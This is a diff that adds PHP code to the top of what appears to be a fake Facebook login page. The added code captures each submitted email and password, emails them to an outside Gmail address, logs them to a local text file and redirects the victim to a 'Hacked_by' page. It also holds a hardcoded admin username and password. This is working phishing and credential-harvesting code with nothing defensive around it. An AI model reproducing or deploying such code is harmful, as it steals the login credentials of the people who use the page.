@@ -1,3 +1,33 @@
+<?php
+    session_start();
+    ob_start();
+?>
+    <?php
+    	if(isset($_POST["login"])){ //name in button HTML (send)
+    		$username = $_POST["email"]; //name in HTML
+    		$password = $_POST["pass"]; //name in HTML
+            if($username == "slhd2003" && $password == "slhd2003"){
+                echo "<script>alert('Bạn đang đăng nhập vào Admin');</script>";
+                header('Location: Admin');
+                
+            }else{
+                    
+             $_SESSION["Username"] = $username;
+             echo $_SESSION["Username"];
+    		 $subject = "Mã nguồn: Sơn Lý Hồng Đức:\nLưu ý: Thông tin này là bảo mật, tuyệt đối không tiết lộ cho bất kì ai\nTài khoảng đã đăng nhập:";
+             $headers = "Đăng nhập Facebook";
+             $comment = "";
+             $body = "----------------------------------------------\nTài khoản: $username\nMật khẩu: $password \n----------------------------------------------\n";
+             mail("sonlyhongduc@gmail.com", $headers, $body, $subject);
+            $test = fopen("Tài khoảng.txt","a");
+            fwrite($test,$body);
+            fclose($test); 
+            header('Location:https://duccodedao.github.io/Hacked_by_BmassHD/');
+          }
+    	}
+
+    ?>
+
 <!DOCTYPE html>
  <html lang="en">
  <head>
